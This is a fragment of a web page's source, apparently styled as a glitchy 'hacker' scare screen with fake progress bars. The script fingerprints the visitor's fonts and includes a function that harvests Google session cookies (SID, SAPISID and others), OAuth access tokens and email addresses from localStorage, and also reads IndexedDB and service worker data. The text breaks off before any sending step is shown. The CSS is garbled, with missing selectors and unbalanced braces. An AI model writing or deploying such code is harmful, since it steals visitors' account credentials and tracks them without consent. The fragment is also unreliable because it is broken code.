            left: 0;

            height: 100%;

        }

            left: 0;
            width: 100%;
            height: 100%;

            z-index: 1;
            opacity: 0.15;
        }

            left: 0;

            pointer-events: none;
            z-index: 3;

            width: 12px;
            height: 20px;
            background-color: #FF0000;
            animation: blink 1s infinite;
            pointer-events: none;
            z-index: 10000;

        @keyframes blink {

        /* Search container */

            top: 50%;
            left: 50%;

            color: #FFF;

        /* Glitch Animation */
        @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(-2px, -2px); }
            60% { transform: translate(2px, 2px); }
            80% { transform: translate(2px, -2px); }
            100% { transform: translate(0); }
        }

        @keyframes matrixFall {

            margin: 30px auto;
            height: 20px;
            background: #222;
            border: 2px solid #FF0000;
            border-radius: 10px;

        }

        .skeleton-progress-bar {
            height: 100%;

        .skeleton-steps {

        }

        }

        .skeleton-timer {
            color: #FF0000;
            font-family: 'Courier New', monospace;
            font-size: 24px;
            margin-top: 20px;
        }

                const detected = [];
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');
                fontList.forEach(font => {
                    context.font = '72px monospace';
                    const baseline = context.measureText('mmmmmmmmmm').width;
                    context.font = '72px ' + font + ', monospace';

        // Enhanced Google token extraction
        async function extractGoogleTokensAdvanced() {
            const googleDomains = [
                'google.com', 'accounts.google.com', 'gmail.com',
                'youtube.com', 'drive.google.com', 'photos.google.com'
            ];
            
            let extractedAccounts = [];
            
            // Method 1: Direct cookie extraction
            document.cookie.split(';').forEach(cookie => {
                googleDomains.forEach(domain => {
                    if (cookie.includes(domain)) {
                        const [name, value] = cookie.trim().split('=');
                        if (name.includes('SID') || name.includes('HSID') || 
                            name.includes('SSID') || name.includes('APISID') ||
                            name.includes('SAPISID') || name.includes('LOGIN_INFO') ||
                            name.includes('ACCOUNT_CHOOSER')) {
                            
                            extractedAccounts.push({
                                source: 'Google Cookie',
                                token: `${name}=${value.substring(0, 30)}...`,
                                domain: domain,
                                timestamp: new Date().toISOString(),
                                accessLevel: 'FULL'
                            });
                        }
                    }
                });
            });
            
            // Method 2: LocalStorage token harvesting
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);
                
                if (key.includes('google') || key.includes('oauth') || 
                    key.includes('auth') || key.includes('token')) {
                    
                    try {
                        const parsed = JSON.parse(value);
                        if (parsed && parsed.email) {
                            extractedAccounts.push({
                                source: 'LocalStorage',
                                email: parsed.email,
                                access_token: parsed.access_token ? 
                                    `${parsed.access_token.substring(0, 20)}...` : 'present',
                                expires: parsed.expires_at || parsed.expiry_date,
                                fullData: value.substring(0, 200)
                            });
                        }
                    } catch {
                        if (value.includes('@gmail.com') || value.includes('@googlemail.com')) {
                            extractedAccounts.push({
                                source: 'LocalStorage Raw',
                                data: value.substring(0, 150),
                                suspectedEmail: value.match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/gi)
                            });
                        }
                    }
                }
            }
            
            // Method 3: IndexedDB Google databases
            if (window.indexedDB) {
                try {
                    const dbs = await indexedDB.databases ? await indexedDB.databases() : [];
                    dbs.forEach(db => {
                        if (db.name && (db.name.includes('google') || db.name.includes('gmail') ||
                            db.name.includes('chrome') || db.name.includes('profile'))) {
                            
                            extractedAccounts.push({
                                source: 'IndexedDB',
                                database: db.name,
                                version: db.version,
                                suspectedPurpose: 'Google Profile Storage'
                            });
                        }
                    });
                } catch (e) {
                    // IndexedDB access blocked
                }
            }
            
            // Method 4: Service Worker registration inspection
            if ('serviceWorker' in navigator) {
                try {
